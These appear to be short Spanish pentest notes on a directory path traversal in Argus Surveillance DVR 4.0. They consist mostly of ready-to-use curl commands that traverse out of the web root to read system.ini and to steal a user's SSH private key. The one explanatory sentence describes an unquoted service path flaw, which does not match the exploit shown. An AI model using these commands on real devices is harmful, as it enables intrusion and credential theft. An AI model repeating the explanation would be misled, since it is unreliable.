# Argus Surveillance DVR 4.0

Tags: #Argus #Windows 

## Directory Path Traversal 

* [PathTraversal](https://www.exploit-db.com/exploits/45296)

La vulnerabilidad aparece cuando **la ruta completa del ejecutable de un servicio contiene espacios y no está encerrada entre comillas**.

```bash 
# Verificar lsi funciona el PoC 
❯ 
curl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```

```bash 
Paso 1:
# Buscar el nombre de un usuario 'viewer' en la apliación DVR4 en users

Paso 2:
# Obtener su llave privada 
❯ curl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa"
```